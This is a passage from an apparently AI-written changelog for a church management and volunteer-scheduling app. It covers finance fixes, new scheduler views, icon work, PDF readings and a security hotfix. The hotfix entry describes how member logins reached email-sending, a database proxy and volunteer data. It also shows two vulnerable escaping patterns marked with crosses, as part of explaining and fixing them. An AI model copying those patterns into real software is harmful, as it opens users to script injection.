**Every new test verified non-vacuous — 8 injections, 8 correct failure sets**, in both
directions: each of the four filters removed, the empty-household 404 removed, and three
over-application injections (the filter applied to staff, to the household list for all roles,
and to disambiguation for all roles).

**⚠ Two of my own tests were vacuous on the first draft and were rewritten, not accepted.** The
fixture made Jane the head and John the opted-out spouse — so disambiguation never had to choose
between them, and both disambiguation assertions passed against deliberately broken code. The
opted-out person is now the HEAD of a duplicated-name household, which is the only arrangement
that exercises the path. A comment in the fixture says so.

**Not verified**: a live browser, a real phone, or production D1. (`src/api-people.js`,
`src/api-households.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`,
`test/member-directory-optout.test.js`, `test/member-household-redaction.test.js`)

### v1.191.0 — Phase 21: the scheduler backend gate stops treating authentication as authorization (2026-08-19)

Security hotfix, nothing else in it. Closes SEC11-SEC14 and DSN9 from the CR10 review.

**The two criticals were one line.** `tlc-volunteer-worker.js` gated the whole scheduler
backend block on `schedAuthed = (WORKER_SECRET match) || await isAuthed(req, env)`, with a
comment saying these routes "must never be publicly reachable without authentication." That was
true when every session belonged to staff. The `role='member'` tier (CONN1/CONN2) made it false
— a congregant's read-only directory cookie satisfies `isAuthed()` — so a member reached:

- **`POST /email/send`**: arbitrary `to`/`subject`/`html`/`attachments` through Resend, sent as
  the church's verified `EMAIL_FROM`. A phishing primitive with the church's own domain
  reputation behind it, aimed at the congregation.
- **`/api/*` and `/breeze/*`**: the Breeze proxy, forwarding **any method and any path** with
  `BREEZE_API_KEY`. Read *and write* on the church's entire Breeze database — giving, notes,
  everyone the ChMS member view deliberately filters out.
- **`/serve/pending`, `/serve/general-pending`, `/serve/event-pending`**: volunteer names,
  emails, phones, free-text notes.

All three were confirmed reachable against the real worker with a real HMAC-signed member
cookie before the fix, and confirmed 403 with no upstream call after it.

Fixed at the gate, not per handler: `schedPrivileged` (admin/staff, or the worker secret) plus
one `isPrivilegedSchedPath` set. **⚠ The `X-Worker-Secret` bypass still works** — the
scheduler's own server-to-server calls ride it. **⚠ `/esv/passage` stays open to any
authenticated role** (public Scripture text, no PII, key never leaves the server). The
privileged set is a LIST, not "everything after the gate", specifically so the `/scheduler`
redirect and the 404 catch-all keep their existing behavior — that catch-all's `no-store` is
load-bearing. admin/**staff** matches SW1/SW2's bar for the `/admin/api/scheduler/*` siblings;
the Scheduler tab itself is admin-only, so staff is deliberately a superset of what any UI can
reach.

**The escaping bug was worse than the review said, and the helper itself was the problem.**
SEC13 reported `volJsAttr(esc(s.name))` on the Signups "Link" button. Testing the helper
against hostile input showed `volJsAttr` was **also injectable on its own**: it escaped the
quotes `JSON.stringify` added but not a literal `&quot;` already inside the value, which the
HTML parser decodes back into a real quote just the same. So all 25 call sites were wrong, not
one.

**⚠ The order of the two steps is the whole thing**, and it is now written above the helper:

    esc(JSON.stringify(v))                    ✅ stringify, then escape the finished literal
    JSON.stringify(esc(v))                    ❌ SEC13 — esc's &quot; survives untouched
    JSON.stringify(v).replace(/"/g,'&quot;')  ❌ the old volJsAttr — same, for a literal &quot;

`volJsAttr` is therefore replaced by `jsAttr` in `js-core.js` beside `esc()` (retires DSN9 — a
`vol*`-named helper called 29 times from `js-finance.js`), with a comment stating the two must
never be composed. Verified against 13 hostile payloads: 0 injections, and every value
round-trips to the handler byte-identical, so nothing about the Link/select behavior changed.

Six SEC14 sites converted to `jsAttr(raw)`: `js-households.js` (household + person
autocomplete), `js-reports.js` (household autocomplete), `js-export-import.js`
(`svMigPickSearchResult`, and `bzlPickSearchResult` normalized even though it happened to be
safe), `js-tuition-aid.js` (`tapPickSuggestion`). **⚠ Three of them carried a
`.replace(/'/g,'&#39;')` on an already-`esc`'d value** — a no-op that read as protection, which
is most of why they survived three previous passes at this bug class.

Reachability was not theoretical: `POST /serve/signup` is fully public and takes `name` with no
character filter, and `POST /api/intake/connect-card` (the website contact form) is the same for
person names. Opening **Volunteers → Signups** rendered the button unconditionally.

**Two new test files, 28 tests.** `test/scheduler-route-authz.test.js` drives the real worker
with real signed cookies per role and asserts both the status code and that nothing reached
Resend or Breeze; it also derives the route list from the worker's own source, so a route added
below the gate without a matching entry fails. `test/inline-handler-escaping.test.js` guards the
class rather than the instances — this is its fourth appearance (VUXBUG2 -> SW11 -> REV1 ->
SEC13/SEC14) — with three source scans plus the real shipped `jsAttr` run through a full
attribute-decode-and-execute round trip.

**Every new test verified non-vacuous by injecting the exact regression it guards** (9
injections, 9 correct failure sets): gate removed, gate widened to any authed role,
worker-secret bypass broken, a route added below the gate but not to the list, `jsAttr` reverted
to the old body, `jsAttr` escaping before stringify, SEC13 restored, SEC14 restored, and the
no-op `.replace` sanitizer restored.

`npm test` 1629/1629 (90 files, 5 skipped — the pypdf-gated block), up from 1601/88. Plus
`node --check` on all four built bundles and the worker, and a div-balance scan of the assembled
shell. **Not verified**: a live browser, a real phone, a real sent email, or production D1.
(`tlc-volunteer-worker.js`, `src/frontend/js-core.js`, `src/frontend/js-volunteers.js`,
`src/frontend/js-households.js`, `src/frontend/js-reports.js`,
`src/frontend/js-export-import.js`, `src/frontend/js-tuition-aid.js`,
`src/frontend/js-finance.js`, `src/frontend/js-giving.js`,
`test/scheduler-route-authz.test.js`, `test/inline-handler-escaping.test.js`)

### v1.190.0 — FY base year computed from the roster; dental and vision corrected (2026-08-07)

The "FY2027 comes out lower than FY2026" report, resolved. Two things were wrong.

**1. Dental and vision were stored at twice their real value.** The church supplied the actual
premiums: **$120.61/mo dental and $61.32/mo vision per worker** on the current plan. The stored
figures ($2,894.64 and $1,471.68) are exactly 2x those — the renewal packet quotes those lines for
the two contracts enrolled at the time, and they had been transcribed as if they were per worker.
Corrected to real per-worker annual amounts. A family-tier worker now prices at **$24,831.48** on
the current plan — the church's own figure to the cent — and **$26,871.24** on renewal.

This also settles a contradiction recorded under FIN58, which took an earlier "$29,130.48 per
worker" at face value and doubled the ancillary lines. That figure came from adding the packet's
dental and vision lines whole. **The packet's dental/vision lines are not per-worker figures; check
one against the per-worker monthly premium before entering it.**

**2. The base year was measuring a different population, and no account-level rule could fix it.**
The ledger basis sums every account named like payroll or health. At this church those accounts also
carry daycare/MDO staff, supply preachers and nursery wages, while the plan models seven named
people. Against the church's own 2026 figures the same seven cost $428,844 where the ledger reads
$468,834 — a ~$40k gap that is entirely population. It is not correctable account by account either:
pooled benefit accounts (health, pension, employer taxes) are charged for the whole staff on one
line and can never be attributed to a person, so the existing roster-only toggle could only ever fix
the salary half.

New **roster basis**, now the default: the base year is computed by running the *same model* over
the *same counted roster* at the base year's own rates and the health plan in force then
(`finCompRosterBaselineDetail`, `finCompActiveBaseline`). `finCompBenefits` and
`finCompWorkerHealthCents` take an optional `{year, planOption}` — omitted, every existing caller
behaves exactly as before. "No raise" therefore lands at **exactly 0%** by construction, and what is
left is a real move: pension 10.70% -> 11.70% plus the premium renewal. On a realistic roster that
reads **+1.7%** where the ledger basis read **-11.6%**.

The ledger figure is not hidden — a basis picker switches between them, and the roster note prints
the ledger total underneath with the difference named and explained. A worker flagged *paid from
another budget* now leaves **both** years together, so the two sides stay like-for-like by
construction.

Assumptions the roster basis makes, all stated on screen: each worker's coverage tier and minister
status were the same in the base year, base-year pay is whatever "current pay" resolves to, and an
opt-out worker uses the base year's shared opt-out figure rather than a per-worker planning override.

**Verified:** `npm test` (1588/1588, 12 new). Non-vacuous both ways — neutering the roster basis
fails 3, reverting the dental/vision constants fails 2, including the check against the church's
stated $24,831.48. The ledger-basis tests now pin the basis they test rather than relying on a
default. **Not verified:** a live browser, or against the real FY2026 ledger.


### v1.189.0 — Say which side the FY comparison gap is on, and two display bugs (2026-08-07)

Reported at v1.188.0 with a screenshot: under **No raise**, FY2027 came out $28,752 (6.1%) BELOW
the FY2026 figure. No raise cannot cost 6% less, so something on one side is counting a different
population.

**The tab could not tell you which side.** The comparison already lists the base-year accounts and
flags salary accounts no rostered worker is paid from — but a single net percentage cannot say
whether the SALARIES disagree or the BENEFITS do, and those have completely different causes: a
salary gap is usually a ledger account nobody on the roster is paid from (another section's
payroll), a benefits gap is usually the ledger carrying coverage the roster does not model. The
base-year note now opens with a three-column split — FY{base} ledger, FY{target} plan, difference —
for salaries and for benefits & taxes separately, and states in words which side carries most of the
gap and what that usually means. `finCompBaselineDetail()` gained `salaryCents`/`benefitCents`,
summed over the same counted rows the total uses, so the split cannot disagree with the figure.

**Two bugs visible in the same screenshot, both fixed:**

- The selected-worker subtitle rendered as `Lead Pastor &middot; 20 yrs &middot; M.Div.` — literal
  entity text. The string was built with the separator markup inside it and then passed through
  `esc()`, which escaped the ampersand. Now each part is escaped on its own and joined with the
  separator markup. Escape the data, never the markup.
- The tile read **"VS FY2026 $468,834 (ANNUALIZED)"** even when nothing had been annualized. The
  label was driven by `prorated`, which is just "the base year is still in progress" — but an
  account with its own full-year budget is used as-is, so a ledger with budgets throughout
  annualizes nothing. Now driven by new `anyAnnualized`, true only if some counted row actually
  used the annualized basis.

**Verified:** `npm test` (1579/1579, 4 new). Each checked non-vacuous by reverting the fix it guards
— the split test and the subtitle test fail on revert, and the annualized test was strengthened
after the first version passed against the broken label (it asserted the detail object rather than
the rendered label, which is the thing that was wrong). **Not verified:** a live browser, or against
the church's real FY2026 ledger — which is exactly what the new split is there to expose.


### MKT1 — Christmas Market signup summary for the website admin (2026-08-18)

New read-only, server-to-server `GET /api/signups/christmasmarket/summary` so the website
repo's Christmas Market admin screen (admin.timothystl.org) can show a Volunteers tab from
live ChMS data. Backend only — no frontend change, so `DEPLOY_VERSION` is deliberately not
bumped (it is the cache-buster for the app JS bundles, and CI1 records how easily two
sessions collide on that line).

- **The data model already existed and is the one the public Serve site writes to** — no new
  table, no migration. `serve_events` ('Christmas Market', seeded in `src/db.js` with
  `XMAS_MARKET_ROLES`) → `serve_roles` (one row per shift: `name` + `role_date` +
  `start_time`/`end_time` + `slots` capacity) → `signup_slots` (the join a public sign-up
  writes, one row per person per shift) → `signups`. Fill counts come from `signup_slots`,
  exactly as `handleApiEvents` already computes them.
- **A `serve_roles` row IS a shift**, not a role — "Parking" at 8:30 and "Parking" at 11:00
  are two rows. The response groups them by name, which is why `roles[].shifts[]` nests.
- **⚠ The shift label must carry its date.** The market runs two days (setup Friday, market
  Saturday) and several roles repeat on both, so a time-only label would be ambiguous.
  Formatted from a UTC-parsed date so the weekday cannot slide with the Worker's locale.
- **⚠ `needed` is `null`, never `0`, when `slots` is 0** — that is the column default and
  means "no capacity recorded", a different fact from "nobody needed". A 0 would render as
  a fully-staffed shift. Such a shift is also not counted in `openShifts`.
- **`signedUp` counts people, not shifts** — one `signups` row per person per event (the
  sign-up POST refuses a second for the same email), so somebody taking three shifts is one
  volunteer.
- **Auth is the existing `X-Intake-Key` / `CHMS_INTAKE_API_KEY` shared secret**, the same one
  `/api/intake/*` already uses in this direction. It returns volunteer names and emails, so a
  Worker with no key set answers **503** rather than serving PII. No CORS headers — nothing in
  a browser calls this.
- **A missing event is a 200 with `{open:false, signedUp:0, openShifts:0, roles:[]}`**, never
  an error: the caller has to render a "not open yet" state, not crash. `open` is
  `!serve_events.hidden`; a hidden event still reports its real figures.
- **⚠ The route must sit above the `/api/*` Breeze-proxy catch-all** in
  `tlc-volunteer-worker.js` (line ~325 vs ~566) or it never matches. Same trap `/api/events`
  is already worked around for.
- The event is resolved by `slug='christmasmarket'` first, falling back to `name='Christmas
  Market'` — the slug is admin-editable, the name is what `src/db.js` seeds and migrates
  against, so either alone is brittle.
- `npm test` (1545/1545, 11 new in `test/market-signup-summary.test.js` against real in-memory
  SQLite); **every new test verified non-vacuous** by injecting the exact regression it guards
  (3 injections, 4 correct failures). **Not verified**: a live call from the website Worker.
  **One step for an admin**: `CHMS_INTAKE_API_KEY` must be set on the website repo's
  `tlc-newsletter-admin` Worker with the same value as here — see G24, still open.
  (`src/api-scheduler.js`, `tlc-volunteer-worker.js`, `test/market-signup-summary.test.js`)

### v1.188.0 — SC17: People & Availability — the loaded month, on the People tab (2026-08-17)

Applied the **People and Availability** design handoff. The People tab stops being a static
roster and starts answering "who is carrying this month, who is not, and who is away."

- **⚠ No second person editor was built.** The handoff draws its own right-hand edit drawer, but
  `#person-panel` already carries every field that drawer shows — name, email, roles, service
  preference, preferred Sundays, role-by-Sunday overrides, primary-for, blackouts, absence. A
  second editor that looks like the real one is the **SAC2** defect exactly: it becomes the
  obvious thing to change and it is the copy nobody sees. Roster rows and board cells open the
  panel that already exists.
- **One walk of the month feeds everything.** New `peopleMonthStats()` reads `currentSchedule`
  once and produces per-person jobs, count, away Sundays and conflicts; the chips, the roster's
  new month column, the rail and the board all render from it, so the chips cannot call someone
  "not yet scheduled" while the board shows them serving. A person filling two roles on one
  Sunday counts that Sunday once.
- **"Away" is a blackout date — the store `eligible()`, Auto-Fill and the role picker have always
  honored.** No new table, no new endpoint, and marking someone away really does keep them out of
  next month's fill. **⚠ The write-through matters**: `savePeople()` is localStorage only, and a
  relational volunteer's record lives in D1, so the toggle also POSTs `/scheduler/volunteers` —
  without it the next `d1Pull()` quietly restores the old value and the change appears to vanish.
  New `volunteerApiFields()` builds that body, and a test derives the panel's own field list from
  the served source so the two cannot drift.
- **An absence WINDOW is not a click target.** It is a date range on the person, so a single cell
  cannot clear it; those cells are marked locked and say which setting is holding them, rather
  than offering a click that silently does nothing.
- **A conflict — away on a Sunday they are assigned — is surfaced first**, in the row flag and at
  the top of the rail. It was previously invisible.
- **With no schedule generated the month figures are withheld, not zeroed.** Zeros would read as
  "nobody is serving" rather than "no month yet"; the chips, the roster column, the rail and the
  board each say so in their own words. A special service is not a board column, same reasoning
  as the Schedule grid.
- **The old three-column Availability view is deleted, not orphaned** — renderer, its three
  predicates and its CSS — along with the dead 700px media query that only styled it.
- `npm test` (1539/1539, 27 new in `test/scheduler-people-availability.test.js`, driving the real
  served script in a `vm`); **every new test verified non-vacuous** by injecting the exact
  regression it guards (10 injections, 10 correct failure sets). **Two of my own assertions were
  wrong and were corrected rather than forced**: one sliced to the first `/scheduler/volunteers`
  in the file, which is an unrelated earlier call, so it asserted against an empty string; the
  other counted `<thead>` as a `<th>`. Plus `node --check` on the served `<script>`, CSS brace
  balance and div balance on both builds, confirmation the new selectors are scoped under
  `.sched-root` by the embed transform, and `scheduler/index.html` resynced by evaluating the
  module (SC5). **Not verified**: a live browser.
  (`src/scheduler-html.js`, `scheduler/index.html`, `test/scheduler-people-availability.test.js`)

### v1.187.0 — SC16: Grid view — the whole month as one table (2026-08-17)

Applied the **Sunday Volunteer Grid View** design handoff. Adds a **Grid** position to the
Schedule tab's existing Week / Month toggle: every Sunday of the month as a column, every role as
a row, in the same three bands the Week view prints (8:00 AM · 10:45 AM · Both Services).

**⚠ The handoff's own copy of `src/scheduler-html.js` was stale** — synced 2026-08-16, i.e. before
SC10–SC15 landed. It was read for the design and never merged over the live file; the grid was
built onto current `main` instead.

- **A grid cell and a role row are two layouts over ONE slot.** New `roleSlotView()` resolves who
  is assigned, whether they are the role's primary, whether they are filling from the other
  service, and the confirmation key + status; `buildRoleRowHtml` and the grid cell both render
  from it. That is what lets a cell keep the `.role-row` class and the same
  `data-row`/`data-role`/`data-svc` attributes, so the existing `#fw-detail` delegation opens the
  same picker and cycles the same confirmation with no new interaction code at all. A second
  hand-inlined copy is how the two views would come to disagree about who is where (SW17).
  **Verified byte-for-byte**: Week, Month and a special-service Sunday render identically to
  `main` after the refactor, including star, "other svc" and both confirmation states.
- **⚠ A special service is NOT a column, deliberately.** Its services are not 8:00/10:45 and its
  roles are free text, so it has no row to land on in a fixed role grid. It is named in a strip
  below the grid — with a button back into Week view, which can edit it — and its slots are
  excluded from the figures, which the strip says outright. Silently dropping it from a view
  titled "the whole month" is the FIN58 defect.
- **The figures come from the same walk that draws the columns**, so Filled + Open always equals
  Slots and Slots always equals columns x roles. Per-column coverage bars and a per-role
  "N of M Sundays" sit beside them.
- **Sticky is on the role-label column (left), not the header (top)** — this pane only ever
  scrolls horizontally, and a role name is what a reader needs kept in view.
- **Print gains a fourth mode, "Month Grid"** (landscape letter), transposed from the existing
  Full Month sheet rather than duplicating it: that one reads a Sunday at a time, this reads a
  role at a time, which is the question somebody at a bulletin board is asking. **An unfilled slot
  prints the word OPEN, not a dash** — on a wall an empty box reads as finished. Printing while
  the Grid is on screen opens on it. Stays well-formed XML (self-closed void tags, real Unicode,
  no named entities) so Copy/Download Image keeps working (SC7-FIX2).
- `npm test` (1512/1512, 32 new in `test/scheduler-grid-view.test.js`, driving the real served
  script in a `vm`); **every new test verified non-vacuous** by injecting the exact regression it
  guards (8 injections, 8 correct failure sets). Plus `node --check` on the served `<script>`,
  CSS brace balance on both the standalone and embedded builds, div/button/span balance on the
  grid output, an XML parse of the print sheet, confirmation that all six new selector groups are
  scoped under `.sched-root` by the embed transform, and `scheduler/index.html` resynced by
  evaluating the module (SC5) and confirmed byte-identical. **Not verified**: a live browser or a
  real print dialog.
  (`src/scheduler-html.js`, `scheduler/index.html`, `test/scheduler-grid-view.test.js`)

### v1.186.0 — BRAND7: logo artwork re-made at 2.5x, every icon rebuilt (2026-08-17)

The designer had the mark re-made. It arrives at **627x627** against the 240px that BRAND2
recorded as a hard ceiling, so `icon-512.png` is a downsample for the first time instead of an
upscale. That is the sharpness fix the last four BRAND entries could not deliver in code.

**The first re-make was a JPEG and had to be rejected.** JPEG carries no alpha, so its
"transparent" background was solid `#000000` — 77% of the file, and a black rectangle on the white
login card. It is also lossy: each quadrant held 3,200-4,500 distinct values with the dominant
color covering only 10-22% of its own area (the visible confetti around "TIMOTHY LUTHERAN CHURCH"
and the yellow-green fringe under the mark). **Salvage was attempted and shown to be impossible**,
rather than assumed: keying the black out recovers the bright quadrants, but the wordmark, church
and cross are dark navy *on black* and are mathematically indistinguishable from the ground at any
coverage — they came back as ghosts. The rendered proof was what settled it.

The PNG re-make is sound: 82.8% fully transparent, 15.6% essentially opaque, ~1.6% in between —
a genuine anti-aliased edge, not a keyed matte — and 835-987 distinct values per quadrant.

Three corrections applied on our side, each one a thing the supplied file gets wrong every time:

1. **Colors drift on every re-make** (`#64A53A` / `#246CD1` / `#2CA9BB` / `#F39F22` here). Each
   quadrant is snapped by scaling its channels `target/dominant`, which preserves the shading and
   the anti-aliased edge where a flat replace would leave jaggies. Bounded to the cropped mark
   square — unbounded, the quadrant test also catches the blue church-name text (the BRAND5 bug).
2. **The supplied center disc is transparent; ours has to be white.** The sidebar is
   `var(--navy)`, so a navy church on a transparent disc over navy simply disappears. A white
   circle is composited *under* the art so the ring's inner edge blends into it; `r=168` of 627,
   because anything larger leaks out through the mark's own axis gaps.
3. **App icons are the mark on a navy `#16294A` rounded plate.** The first rebuild shipped the
   bare mark and dropped the plate — caught only by diffing against the live icons, not by
   reading. Geometry is now measured off what is deployed and reproduced exactly: corner radius
   19.7%, mark 70.9% of the plate, maskable 60.7% on a full bleed.

Served sizes are deliberately smaller than the master: the mark renders at 40px/28px so it ships
at 256px (**17.6 KB, down from 42 KB**), the lockup renders at max-width 300px so it ships at
900px (49.8 KB for 3.5x the pixels). The lockup's aspect moved 2.449 → 2.687, so the login page's
`<img width/height>` moved with it or the reserved space would be wrong.

`npm test` (1448/1448 — markup and assets only, no logic touched). **Not verified**: a live
browser, a phone home screen, or an installed PWA. **Still raster** — 627px covers every current
use, but a banner or a print piece would exhaust it. Only vector ends that.
(`icons/*`, `favicon.svg`, `src/html-templates.js`)

### v1.185.0 — SC15: the Liturgist is sent all four readings (2026-08-17)

Church's own call: *"The liturgist should be sent all three readings, lector only epistle and ot."*
The Lector's half was already right; the Liturgist was being sent only Gospel + Psalm.

- **Lector**: OT + Epistle (unchanged).
- **Liturgist**: OT + Epistle + Gospel + Psalm — the three readings, **plus the Psalm they already
  had**. Keeping the Psalm is an assumption, stated here rather than buried: "all three readings"
  names the lessons, and dropping the Psalm would take away something the Liturgist receives today.
  One line in `readingsForRole` if that is wrong.
- **One line changed, four surfaces followed** — the on-screen readings strip, the HTML email, the
  plain-text email and the PDF sheet all read `readingsForRole()`. That consolidation (SC12) is
  what made this a one-line change instead of four.
- **The editor panel had to be relabelled.** It grouped its fields under "Emailed to the Lector" /
  "Emailed to the Liturgist", and that grouping is now false — OT and Epistle go to both. Each
  field names its own recipients instead.

`npm test` (1480/1480, 3 new); **every new test verified non-vacuous** by injecting the exact
regression it guards (4 injections, 4 correct failure sets, including reverting the Liturgist to
the old pair). Three existing tests asserted the old split and were updated — they were pinning the
behavior that was just corrected, not catching a break. **Not verified**: a live browser or a real
sent email.

(`src/scheduler-html.js`, `scheduler/index.html`, `src/frontend/js-core.js`,
`test/scheduler-readings.test.js`)

---

### v1.184.1 — CI: auto-merge silently deleted the DEPLOY_VERSION export (2026-08-17)

Found by a real CI failure on the SC14 branch: three tests failed in
`test/asset-cache-policy.test.js` and `test/service-worker.test.js` — **files that branch never
touched** — while the same tests passed on `main` alone and on the branch alone.

**Cause: `.github/scripts/resolve-auto-merge-conflicts.js`, not the branch.** When two `claude/**`
branches collide on the `DEPLOY_VERSION` line, that script auto-resolves it — but it rebuilt the
line as a bare **`var DEPLOY_VERSION = '...'`**, while `js-core.js` declares
**`export const DEPLOY_VERSION`**. Auto-resolution therefore deleted the named export, every
importer read `undefined`, and the failures landed in unrelated files:

- `/admin/app-member.js: expected 'no-store' to match /immutable/` — the asset route was asked for
  version `undefined`, so it correctly refused to be cached
- `.toMatch() expects to receive a string, but got undefined`
- the service worker's `chms-static-<version>` cache key stopped matching

The `var` form is not imaginary — it appears in `js-core.js` inside the `JS_CORE` template
literal, which is a different line and never the conflicted one. Easy mistake, invisible until two
branches raced.

**Fix**: the declaration is now captured from the conflicting side and rebuilt, never retyped, so
whatever form the file uses survives. Plus a backstop — the resolved file is checked for a
`DEPLOY_VERSION` **export** before it is written, and the job fails rather than pushing a build
that imports `undefined`. The script gained a `module.exports` (running it directly is unchanged)
so the logic is testable without a merge in progress; `test/auto-merge-resolver.test.js` covers
both conflict shapes, the refusal cases, and couples the guard to how `js-core.js` really declares
the constant.

Verified by reconstructing the exact conflicted file: the old code produces a file with no export,
the new code produces `export const DEPLOY_VERSION = '1.183.1';`.

**This was pre-existing infrastructure, hit by chance.** It would have fired for any two branches
racing on the version line, in either direction.

(`.github/scripts/resolve-auto-merge-conflicts.js`, `test/auto-merge-resolver.test.js`)

---

### v1.184.0 — SC14: the readings can travel as an attached PDF instead of a long email (2026-08-17)

Reported while setting up the ESV key: *"just embedding the text of the readings is a long email. Is
there a way to turn that into a document to attach?"* Correct — four passages inline is a wall of
text. The two-state checkbox becomes a **three-way choice** on the Email Assignments panel:

| Mode | What arrives |
|---|---|
| Reference + link to esv.org | Shortest. No key needed — the only option without one. |
| **Attach the full text as a PDF** | **Default once a key exists.** Short email, printable sheet. |
| Put the full text in the email | The old inline behavior, kept for anyone who prefers it. |

- **The PDF is hand-built, no library** — this app carries no third-party JS anywhere (same choice
  as the hand-rolled xlsx reader in `js-tuition-aid.js`). Helvetica is one of the 14 fonts every
  reader ships, so nothing is embedded and a one-page sheet is **2.8 KB**. Built in the browser and
  base64'd exactly like the `.ics` already is — no new Worker route.
- **The text goes to the sheet OR the body, never both.** Attaching the PDF *and* embedding the
  same words is the long email the attachment exists to avoid; a test pins it.
- **⚠ Verification here is the point.** A hand-built PDF that greps fine can open in nothing, so
  `test/readings-pdf-render.test.js` hands the generated bytes to a **real PDF parser** (pypdf) and
  asserts the words come back out — curly quotes, em dash, ® and © intact through the WinAnsi map.
  Two checks that need no parser (xref-offset integrity, and every drawn line measured against the
  468pt column from the content stream) sit **outside** the pypdf gate so they run in CI too.
- **⚠ pypdf silently REBUILDS a broken xref**, so parsing successfully does not prove the table is
  right — an injection that corrupted every offset passed all seven parser tests. That is why the
  xref test walks the offsets by hand and asserts each points at its own `N 0 obj`.
- Real-data checks: 19 pages flowed from 60 repeated passages, zero lines wider than the column
  (widest 436pt of 468), a 400-character unbroken "word" split rather than running off the page,
  and the Crossway notice landing on the last page.

`npm test` (1467/1467, 19 new). **Every new test verified non-vacuous** by injecting the exact
regression it guards — 10 injections, 10 correct failure sets, after the xref gap above was closed
with a new direct test.

**Not verified**: a live browser, a real sent email, or the PDF opened in Preview/Acrobat/iOS Mail.
pypdf reading it back is strong evidence the file is well-formed, but it is not the same as a human
looking at the page.

**Nothing new to configure** — the mode picker appears once `ESV_API_KEY` is set; without it the
panel stays on link-only and says so.

(`src/scheduler-html.js`, `scheduler/index.html`, `SECRETS.md`, `src/frontend/js-core.js`,
`test/readings-pdf-render.test.js`, `test/scheduler-readings.test.js`)

---
### v1.183.0 — Icon URLs are versioned, so new artwork actually reaches people (2026-08-17)

v1.182.0's recolor deployed green and the live mark was **still blue**: `/icons/connect-mark.png`
returned 200 with the OLD bytes (39,432 — the previous file's exact size). Caught by fetching the
live URL and re-sampling its quadrants, not by trusting the deploy.

**Two caches, and the deploy busts neither.** `/icons/*` and `/favicon.svg` are proxied from
`raw.githubusercontent.com/.../main` with `cacheTtl: 86400`, and the filenames never change:
- **Cloudflare keys its subrequest cache on the UPSTREAM url**, which was constant, so the worker
  kept serving the copy it fetched a day earlier.
- **Browsers key on the client url**, also constant, so anyone who had loaded the old mark would
  hold it for another day regardless.

Both now carry `?v=DEPLOY_VERSION`, the same mechanism app-JS has used since v1.35.0:
- worker → appended to the `raw.githubusercontent.com` fetch (GitHub ignores unknown params;
  Cloudflare sees a new key)
- shell → applied at assembly time in `html-chms.js`, since `html-head.js` is a static
  `String.raw` with no interpolation
- login page → `html-templates.js` now imports `DEPLOY_VERSION` (js-core.js imports nothing, so
  no cycle) and interpolates it into its three icon references

**This closes a caveat carried since BRAND1** ("a warm cache or installed PWA can show the old icon
for a day after merge") — it was a real defect, not a fact of life. Any future artwork change now
reaches people on the next version bump instead of whenever the TTL happens to lapse.

`npm test` (1448/1448, unchanged). Plus `node --check` on the worker and an assertion that every
icon URL in both the shell and the login page carries the version. **Not verified**: a live
browser — but the live URL will be re-checked after deploy, which is what found this.
(`tlc-volunteer-worker.js`, `src/html-chms.js`, `src/html-templates.js`)

### v1.182.0 — The mark's four quadrants recolored to the website's values (2026-08-16)

Canva would only offer three colors to edit. **That was not a Canva limitation — the artwork
contains three.** Both right-hand quadrants are one blue, so RECEIVE and GROW share a fill and
Canva, which selects by color, cannot tell them apart. Confirmed three ways: sampling the
quadrants, counting distinct colors across the whole mark, and Canva's own picker.

**`Connect.svg` from Drive is not vector.** Uploaded to chase resolution; its entire body is
`<defs/>` plus one `<image>` holding a 1248x832 base64 PNG — zero paths. Same dimensions as the
original sheet; compared pixel-by-pixel over the mark, mean difference **2.30/255**, i.e. the same
picture. Its own metadata says `<ContainsAiGeneratedContent>Yes</ContainsAiGeneratedContent>` with
a C2PA manifest, and each "flat" quadrant holds 150-275 distinct values. **This artwork has never
existed as editable shapes, so no re-export will produce vector** — that needs a redraw.

**Recolored by POSITION, which is the one thing Canva cannot do**: which side of the mark's center
a pixel falls on, rather than what color it is. Targets are timothystl.org's own value accents,
read off the live site: WELCOME `#6FA84E` / RECEIVE `#3E7BD1` / GROW `#45AFB8` / GO `#E8A93C`.

**Anti-aliasing is preserved by un-mixing, not replacing.** Each pixel is `a*C_src + (1-a)*white`;
solving for coverage and recompositing with the new color keeps every soft edge. A flat replace
would have left jaggies at every boundary.

**⚠ The first run recolored the wordmark too.** "Which side of the center" is meaningless once you
leave the mark, so the blue "TIMOTHY LUTHERAN CHURCH" text and the rule under CONNECT — both
down-and-right of the mark — came out teal. Caught by rendering the login page, not by reading the
code. Fixed with an `R_OUTER = 125` bound; the pixel count fell from 61,677 to 16,259.

Every asset regenerated from the corrected sheet: mark, lockup, all six icon PNGs, favicon.
Verified by re-sampling the finished mark — two quadrants exact, two within 1-2 per channel (the
un-mixing working against noisy source pixels).

**⚠ Second version collision in one evening.** `origin/main` was already at `1.181.0` from a
parallel session by the time this was ready, so this ships as `1.182.0`. **Re-reading
`DEPLOY_VERSION` from `origin/main` immediately before pushing is what caught it** — the practice
recorded in v1.180.0, now proven twice.

`npm test` (1390/1390, unchanged — assets only). Plus CSS brace balance and div balance on both
shells and the login page. **Not verified**: a live browser. **What this does NOT fix**: sharpness.
The source is still ~240px, so the 512 icon remains an upscale. (`icons/*`, `favicon.svg`)

### v1.181.0 — SC13: links go to esv.org; the full ESV text can be embedded (2026-08-16)

Asked, after SC12: *"can we embed the actual ESV text in the email? or have a link to the esv
website to read it there?"* Both, and they are deliberately different in cost.

**Links now go to esv.org itself**, not BibleGateway-carrying-ESV. No key, no setup, live
immediately: `https://www.esv.org/Romans+8/`. Spaces become `+` and the colon is left literal —
it is legal in a path segment and percent-encoding it only makes the link unreadable. This also
happens to satisfy one of Crossway's three attribution duties (see below).

**The full text can be embedded**, behind an optional `ESV_API_KEY` Worker secret.

- **The key is server-side only.** New `/esv/passage` route proxies `api.esv.org/v3/passage/text/`
  with the key in an `Authorization` header. A browser call was never an option: the embedded
  scheduler runs under CSP `connect-src 'self'`, which blocks api.esv.org outright, and a
  client-held key is readable by anyone with the page open.
- **Licensing was researched, not assumed.** Crossway's API terms: free for non-commercial
  personal, church and ministry use; the text **may** be redistributed by email; 500 verses per
  query; 5,000/day, 1,000/hour, 60/minute. Attribution is **three separate duties**, each met on
  purpose — "(ESV)" with each quotation (`include-short-copyright=true`), the full Crossway notice
  (printed **once per email**, not after every passage, which is what `include-copyright` would
  do), and a link to www.esv.org (every reference is one). The notice appears **only when text is
  actually embedded** — a bare reference is not a quotation.
- **Nothing is cached.** Crossway does not document a caching allowance, and a church sending a
  couple of dozen assignment emails a week sits far under 5,000/day, so there is nothing to buy by
  storing their text. A test pins that two identical requests both reach the API.
- **One fetch per distinct passage per send**, not per recipient — `esvRefsForTasks()` dedupes
